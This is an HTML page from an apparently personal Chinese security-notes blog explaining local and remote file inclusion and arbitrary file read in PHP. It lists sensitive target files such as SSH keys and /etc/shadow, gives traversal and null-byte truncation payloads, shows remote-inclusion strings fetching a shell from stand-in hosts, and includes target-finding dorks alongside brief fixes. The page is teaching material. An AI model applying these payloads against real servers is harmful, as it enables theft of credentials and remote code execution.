@@ -1,0 +1,257 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>一、本地文件包含｜Web 安全 / 文件与执行｜BEN.OPS</title>
+  <meta name="description" content="一、本地文件包含。本文属于Web 安全 / 文件与执行，文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校检被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。 许多工具都支持本地文件包含漏洞的检测…">
+  <meta name="keywords" content="Web 安全，文件与执行，Linux，Windows，MySQL，Apache，PHP，SQL注入，Web 安全 / 文件与执行，一、本地文件包含">
+  <meta name="author" content="BEN">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <link rel="canonical" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-481b75d1f7f2.html">
+  <link rel="alternate" hreflang="zh-CN" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-481b75d1f7f2.html">
+  <link rel="alternate" type="text/markdown" href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2B%E6%96%87%E4%BB%B6%E4%B8%8E%E6%89%A7%E8%A1%8C%2BLinux%2BWindows-%E4%B8%80%E3%80%81%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.md">
+  <link rel="alternate" type="application/rss+xml" title="BEN.OPS RSS" href="https://ben2023niao.github.io/ben-ops-notes/assets/rss.xml">
+  <link rel="alternate" type="application/xml" title="BEN.OPS Sitemap" href="https://ben2023niao.github.io/ben-ops-notes/assets/sitemap.xml">
+  <link rel="author" href="https://t.me/Ben_Bird">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:site_name" content="BEN.OPS 工程笔记">
+  <meta property="og:title" content="一、本地文件包含">
+  <meta property="og:description" content="一、本地文件包含。本文属于Web 安全 / 文件与执行，文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校检被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。 许多工具都支持本地文件包含漏洞的检测…">
+  <meta property="og:url" content="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-481b75d1f7f2.html">
+  <meta property="article:published_time" content="2023-04-14T16:00:00">
+  <meta property="article:modified_time" content="2023-04-14 16:00">
+  <meta property="article:section" content="Web 安全 / 文件与执行">
+  <meta property="article:author" content="https://t.me/Ben_Bird">
+  <meta property="og:image" content="https://ben2023niao.github.io/ben-ops-notes/doc/media/a19366dbd5353adf8f.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="一、本地文件包含">
+  <meta name="twitter:description" content="一、本地文件包含。本文属于Web 安全 / 文件与执行，文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校检被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。 许多工具都支持本地文件包含漏洞的检测…">
+  <meta name="twitter:image" content="https://ben2023niao.github.io/ben-ops-notes/doc/media/a19366dbd5353adf8f.png">
+  <style>:root{color-scheme:light dark;--bg:#f4f0e8;--panel:#fffdf8;--bg2:#e8e1d6;--fg:#202621;--muted:#66736b;
+--line:#d4cbbd;--accent:#176b55;--accent2:#0b6094;--code:#17211d;--codefg:#d8f0e4;--warn:#9b5c12;
+--max:1120px}@media(prefers-color-scheme:dark){:root{--bg:#111713;--panel:#18201b;--bg2:#202b24;
+--fg:#dce9df;--muted:#9aad9f;--line:#314238;--accent:#67d4ad;--accent2:#76b9df;--code:#0a100d;
+--codefg:#cceadd;--warn:#f0b35c}}*{box-sizing:border-box}html{scroll-behavior:smooth;background:var(--bg)}
+body{margin:0;background:radial-gradient(circle at 15% 0,color-mix(in srgb,var(--accent) 8%,transparent),transparent 32rem),var(--bg);
+color:var(--fg);font:16px/1.82 ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
+a{color:var(--accent);text-underline-offset:.22em}a:hover{color:var(--accent2)}.shell{width:min(var(--max),calc(100% - 32px));margin:auto}
+.topbar{position:sticky;top:0;z-index:5;border-bottom:1px solid var(--line);background:color-mix(in srgb,var(--bg) 88%,transparent);
+backdrop-filter:blur(14px)}.topbar .shell{min-height:62px;display:flex;align-items:center;gap:18px}.brand{font:700 1rem/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--fg);text-decoration:none;letter-spacing:.04em}.brand b{color:var(--accent)}.topbar nav{margin-left:auto;display:flex;gap:16px;flex-wrap:wrap;font-size:.9rem}
+main{padding:34px 0 64px}.crumbs{font-size:.84rem;color:var(--muted);margin-bottom:18px}.hero{border:1px solid var(--line);background:var(--panel);
+border-radius:16px;padding:clamp(20px,4vw,42px);box-shadow:0 16px 50px #0000000a}.eyebrow{font:700 .74rem/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--accent);letter-spacing:.12em;text-transform:uppercase}.hero h1{font-size:clamp(1.8rem,4.4vw,3.2rem);line-height:1.2;margin:.55rem 0 1rem;
+letter-spacing:-.025em;overflow-wrap:anywhere}.lede{font-size:1.04rem;color:var(--muted);max-width:75ch;margin:0 0 18px}.meta{display:flex;flex-wrap:wrap;gap:8px}
+.badge{display:inline-flex;align-items:center;border:1px solid var(--line);border-radius:999px;padding:.22rem .68rem;background:var(--bg2);
+font-size:.78rem;color:var(--fg);text-decoration:none}.layout{margin-top:24px;display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:24px;align-items:start}
+.article,.aside-box,.seo-summary{border:1px solid var(--line);background:var(--panel);border-radius:14px}.article{padding:clamp(20px,4vw,48px);min-width:0}
+.article h1,.article h2,.article h3,.article h4{line-height:1.35;letter-spacing:-.012em;scroll-margin-top:80px}.article h2{margin-top:2.2em;padding-top:.6em;
+border-top:1px solid var(--line)}.article h1{display:none}.article img{display:block;max-width:100%;height:auto;margin:1.4rem auto;border-radius:8px}
+.article pre{overflow:auto;background:var(--code);color:var(--codefg);padding:16px;border-radius:9px;line-height:1.6}
+.article code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.9em}.article :not(pre)>code{background:var(--bg2);padding:.12em .34em;border-radius:4px}
+.article table{display:block;max-width:100%;overflow:auto;border-collapse:collapse}.article th,.article td{border:1px solid var(--line);padding:.45rem .65rem}
+.article blockquote{margin:1.4rem 0;padding:.4rem 1rem;border-left:4px solid var(--accent);background:var(--bg2);color:var(--muted)}
+.article hr{border:0;border-top:1px solid var(--line);margin:2rem 0}.aside{position:sticky;top:82px;display:grid;gap:14px}
+.aside-box{padding:16px}.aside-box h2{font-size:.83rem;margin:0 0 12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.aside-box ol,.aside-box ul{margin:0;padding-left:1.15rem}.aside-box li{margin:.5rem 0;font-size:.9rem}.aside-box a{text-decoration:none}
+.seo-summary{margin-top:24px;padding:20px 24px}.seo-summary h2{font-size:1rem;margin:0 0 .65rem}.seo-summary p{margin:0;color:var(--muted)}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}.pager a{border:1px solid var(--line);border-radius:12px;
+padding:14px 16px;background:var(--panel);text-decoration:none}.pager a:last-child{text-align:right}.pager small{display:block;color:var(--muted)}
+footer{padding:28px 0 48px;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}footer .shell{display:flex;gap:16px;flex-wrap:wrap}
+.index-hero h1{font-size:clamp(2.1rem,6vw,4.4rem)}.stat-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:20px}
+.stat{border:1px solid var(--line);background:var(--bg2);border-radius:10px;padding:12px}.stat strong{display:block;font:700 1.35rem/1.2 ui-monospace,monospace}
+.stat span{font-size:.78rem;color:var(--muted)}.year{margin-top:34px}.year>h2{position:sticky;top:62px;z-index:2;margin:0;padding:12px 0;
+background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);font:700 1.25rem/1.2 ui-monospace,monospace}
+.cards{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.card{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:18px}
+.card h3{font-size:1.02rem;line-height:1.45;margin:.35rem 0 .55rem}.card h3 a{text-decoration:none}.card p{margin:.45rem 0;color:var(--muted);font-size:.87rem}
+.card .date{font:600 .77rem/1 ui-monospace,monospace;color:var(--accent)}.tags{display:flex;flex-wrap:wrap;gap:5px}.tag{font-size:.72rem;color:var(--muted);border:1px solid var(--line);
+border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.cards{grid-template-columns:1fr}}
+@media(max-width:620px){body{font-size:15px}.shell{width:min(100% - 22px,var(--max))}.topbar nav{gap:10px;font-size:.8rem}.hero,.article{padding:18px}
+.meta{gap:6px}.stat-grid{grid-template-columns:repeat(2,1fr)}.pager{grid-template-columns:1fr}.pager a:last-child{text-align:left}}
+@media print{.topbar,.aside,.pager,footer{display:none}.shell{width:100%}.article,.hero{border:0;box-shadow:none;padding:0}}</style>
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","@id":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-481b75d1f7f2.html#article","headline":"一、本地文件包含","description":"一、本地文件包含。本文属于Web 安全 / 文件与执行，文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校检被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。 许多工具都支持本地文件包含漏洞的检测…","datePublished":"2023-04-14T16:00:00","dateModified":"2023-04-14 16:00","inLanguage":"zh-CN","articleSection":["Web 安全","文件与执行"],"keywords":["Web 安全","文件与执行","Linux","Windows","MySQL","Apache","PHP","SQL注入","Web 安全 / 文件与执行","一、本地文件包含"],"wordCount":1236,"mainEntityOfPage":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-481b75d1f7f2.html","url":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-481b75d1f7f2.html","author":{"@type":"Person","name":"BEN","url":"https://t.me/Ben_Bird"},"publisher":{"@type":"Organization","name":"BEN.OPS 工程笔记","url":"https://ben2023niao.github.io/ben-ops-notes/"},"image":["https://ben2023niao.github.io/ben-ops-notes/doc/media/a19366dbd5353adf8f.png"]},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"BEN.OPS 工程笔记","item":"https://ben2023niao.github.io/ben-ops-notes/"},{"@type":"ListItem","position":2,"name":"Web 安全 / 文件与执行","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html"},{"@type":"ListItem","position":3,"name":"一、本地文件包含","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-481b75d1f7f2.html"}]}]}</script>
+</head>
+<body>
+  <header class="topbar"><div class="shell">
+    <a class="brand" href="https://ben2023niao.github.io/ben-ops-notes/"><b>$_</b> BEN.OPS</a>
+    <nav aria-label="站点导航">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">交互知识库</a>
+      <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">静态文章索引</a>
+      <a href="https://t.me/Ben_Bird">@Ben_Bird</a>
+    </nav>
+  </div></header>
+  <main class="shell">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">首页</a> › <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">工程笔记</a>
+      › <span>Web 安全 / 文件与执行</span> › <span>一、本地文件包含</span>
+    </nav>
+    <header class="hero">
+      <div class="eyebrow">Web 安全 / 文件与执行</div>
+      <h1>一、本地文件包含</h1>
+      <p class="lede">一、本地文件包含。本文属于Web 安全 / 文件与执行，文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校检被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。 许多工具都支持本地文件包含漏洞的检测…</p>
+      <div class="meta">
+        <time class="badge" datetime="2023-04-14T16:00:00">发布于 2023-04-14</time>
+        <span class="badge">作者 BEN</span>
+        <span class="badge">1,236 字</span>
+        <span class="badge">4 分钟阅读</span>
+      </div>
+    </header>
+    <div class="layout">
+      <article class="article" itemscope itemtype="https://schema.org/TechArticle">
+        
+<h2 id="一-本地文件包含">一、本地文件包含</h2>
+<p>文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校检被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。</p>
+<p>比如 <code>&lt;? include($_GET['path']) ?&gt;</code></p>
+<p>许多工具都支持本地文件包含漏洞的检测，Kadimus是其中一款。具体使用方法参见<a href="https://github.com/P0cL4bs/Kadimus/" rel="noopener noreferrer">Kadimus</a></p>
+<p>以下是一些本地包含漏洞中常利用的服务器上的重要文件</p>
+<pre><code>.htaccess
+
+/var/lib/locate.db
+
+/var/lib/mlocate/mlocate.db
+
+/var/log/apache/error.log
+
+/usr/local/apache2/conf/httpd.conf
+
+/root/.ssh/authorized_keys
+
+/root/.ssh/id_rsa
+
+/root/.ssh/id_rsa.keystore
+
+/root/.ssh/id_rsa.pub
+
+/root/.ssh/known_hosts
+
+/etc/shadow
+
+/root/.bash_history
+
+/root/.mysql_history
+
+/proc/self/fd/fd[0-9]* (文件标识符)
+
+/proc/mounts
+
+/proc/config.gz
+
+/tmp/sess_sessionid
+</code></pre>
+<p>本地文件包含漏洞也常需要进行截断，以下是一些常用的截断方法</p>
+<p>%00截断：</p>
+<p><code>/etc/passwd%00</code></p>
+<p>(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p>
+<p>%00截断目录遍历：</p>
+<p><code>/var/www/%00</code></p>
+<p>(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p>
+<p>路径长度截断：</p>
+<p><code>/etc/passwd/././././././.[…]/./././././.</code></p>
+<p>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
+<p>点号截断：</p>
+<p><code>/boot.ini/………[…]…………</code></p>
+<p>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
+<p>%00 截断更多地用于文件包含，比如 <code>&lt;?php include($_GET['path']).".jpg" &gt;</code> 要求一定是jpg 后缀的，这样我们可以用 <code>1.php?path=php://input%00</code> 这样就把后面的 .jpg 吃掉了。同理 path=../../../../etc/passwd%00  读取 /etc/passwd，在存在文件名后缀限定的情况下，<code>path=../../../../etc/passwd%00.jpg</code>、<code>path=../../../../etc/passwd\0.jpg</code>、<code>path=..\\..\\..\\..\\etc/passwd\0.jpg</code></p>
+<p>当然也可以把 php 代码文件后缀改为 jpg，直接包含执行。</p>
+<p>e.g <a href="https://www.exploit-db.com/exploits/35578/" rel="noopener noreferrer">Cacti Superlinks Plugin 1.4-2 - RCE (LFI) via SQL Injection Exploit</a></p>
+<p>修复方案：</p>
+<p>php中可以使用 open_basedir  将用户文件访问限制在指定的区域。如将文件访问限制在 /dir/user/ 中。</p>
+<p>在php.ini中设置 <code>open_basedir = /dir/user/</code></p>
+<p>但该方法并不是万能的，在某些情况下仍可能会被绕过， 对传入的参数进行校检和过滤始终是有必要的。</p>
+<p>常见的导致文件包含的函数如下：</p>
+<p>PHP： include(), include_once(), require(), require_once(), fopen(), readfile() ...</p>
+<p>当使用前4个函数包含一个新的文件时，该文件将作为 php 代码执行，php 内核不会在意该被包含的文件是什么类型。</p>
+<p>包含 /proc/self/environ 可以看到系统的一些环境变量，如web 路径等。</p>
+<h2 id="二-远程文件包含">二、远程文件包含</h2>
+<p><code>&lt;?php include($_GET['file']); ?&gt;</code></p>
+<ul>
+<li>
+<p>远程代码执行：<code>?file=[http|https|ftp]://example.com/shell.txt</code>
+  (需要allow_url_fopen=On并且 allow_url_include=On)</p>
+</li>
+<li>
+<p>file 协议读取本地文件：<code>file=file://etc/passwd</code>
+(需要allow_url_fopen=On并且 allow_url_include=On)</p>
+</li>
+<li>
+<p>利用php流input：<code>?file=php://input</code>
+  (需要allow_url_include=On，详细→http://php.net/manual/en/wrappers.php.php)</p>
+</li>
+<li>
+<p>利用php流filter：<code>?file=php://filter/convert.base64-encode/resource=index.php</code>
+  (同上)</p>
+</li>
+<li>
+<p>利用data URIs：<code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=%00</code>
+  (需要allow_url_include=On)</p>
+</li>
+<li>
+<p>利用XSS执行任意代码：<code>?file=http://203.0.113.1/path/xss.php?xss=phpcode</code>
+  (需要allow_url_fopen=On，allow_url_include=On并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了)
+  <code>&lt;?php include($_GET['file'] . ".htm"); ?&gt;</code></p>
+</li>
+<li>
+<p><code>?file=http://example.com/shell</code></p>
+</li>
+<li>
+<p><code>?file=http://example.com/shell.txt?</code></p>
+</li>
+<li>
+<p><code>?file=http://example.com/shell.txt%23</code>
+  (需要allow_url_fopen=On并且allow_url_include=On)</p>
+</li>
+<li>
+<p><code>?file=\evilshare\shell.php</code> (只需要allow_url_include=On)</p>
+</li>
+</ul>
+<p>无论是本地文件包含还是远程文件包含， 实际上我们操作文件的函数不只是include()一个，上面提到的一些截断的方法同样可以适用于以下函数：</p>
+<p><img alt="fileinclude" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/a19366dbd5353adf8f.png"/></p>
+<p>自动化检测思路中，比较简单的一种是将url参数值替换为<code>./index.php</code>，如果存在漏洞会出现报错（根据不同系统语言而不同），比如 <code>Failed opening|failed to open stream</code></p>
+<h2 id="三-任意文件读取">三、任意文件读取</h2>
+<p>任意文件读取与文件包含的界限有点模糊，可以认为文件包含包括任意文件读取，只是任意文件读取不会造成代码执行，也就是文件内容输出的上下文不是脚本执行环境。</p>
+<pre><code>从链接上看，形如：
+
+inurl:"readfile.php?file=" 、inurl:"read.php?filename="、inurl:"download.php?file="、inurl:"down.php?file="
+
+从参数名看，形如：
+
+&amp;RealPath= 、&amp;FilePath= 、&amp;ﬁlepath= 、&amp;Path= 、&amp;path= 、&amp;inputFile= 、&amp;url= 、&amp;urls= 、&amp;Lang= 、&amp;dis= 、&amp;data= 、&amp;readﬁle=
+、&amp;ﬁlep= 、&amp;src= 、&amp;menu= 、META-INF 、WEB-INF
+</code></pre>
+<p>自动化检测思路中，payload 是结合绕过姿势尝试读取一些常见的文件，比如 /etc/passwd，/WEB-INF/web.xml 等，匹配是否是所读文件的内容，若是则表示存在漏洞。</p>
+      </article>
+      <aside class="aside">
+        <aside class="aside-box"><h2>本页目录</h2><ol><li style="margin-left:0.0rem"><a href="#一-本地文件包含">一、本地文件包含</a></li><li style="margin-left:0.0rem"><a href="#二-远程文件包含">二、远程文件包含</a></li><li style="margin-left:0.0rem"><a href="#三-任意文件读取">三、任意文件读取</a></li></ol></aside>
+        <div class="aside-box"><h2>文章信息</h2><ul>
+          <li>分类：Web 安全 / 文件与执行</li>
+          <li>日期：2023-04-14</li>
+          <li>标签：<span class="tag">Web 安全</span><span class="tag">文件与执行</span><span class="tag">Linux</span><span class="tag">Windows</span><span class="tag">MySQL</span><span class="tag">Apache</span><span class="tag">PHP</span><span class="tag">SQL注入</span></li>
+          <li><span>来源：01-Web安全/04-文件与执行/文件包含/文件包含.md</span></li><li><a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2B%E6%96%87%E4%BB%B6%E4%B8%8E%E6%89%A7%E8%A1%8C%2BLinux%2BWindows-%E4%B8%80%E3%80%81%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.md" type="text/markdown">查看 Markdown 原文</a></li>
+        </ul></div>
+        <div class="aside-box"><h2>作者</h2>
+          <p><a href="https://t.me/Ben_Bird">@Ben_Bird</a></p>
+          <p>Linux / DevOps / SRE / 云平台 / 安全运维</p>
+        </div>
+      </aside>
+    </div>
+    <section class="seo-summary" aria-labelledby="seo-summary-title">
+      <h2 id="seo-summary-title">文章摘要</h2>
+      <p>一、本地文件包含。本文属于Web 安全 / 文件与执行，文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校检被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。 许多工具都支持本地文件包含漏洞的检测…</p>
+      <p>关键词：Web 安全、文件与执行、Linux、Windows、MySQL、Apache、PHP、SQL注入、Web 安全 / 文件与执行、一、本地文件包含</p>
+    </section>
+    <nav class="pager" aria-label="文章翻页"><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-f426f538a7cb.html"><small>上一篇</small>一、服务器的配置</a><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b30f140b76ff.html"><small>下一篇</small>一、查询数据库信息</a></nav>
+  </main>
+  <footer><div class="shell">
+    <span>© 2026 BEN.OPS</span>
+    <a href="https://github.com/ben2023niao/ben-ops-notes">GitHub</a>
+    <a href="https://t.me/Ben_Bird">Telegram @Ben_Bird</a>
+    <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-481b75d1f7f2.html">本页永久链接</a>
+  </div></footer>
+</body>
+</html>
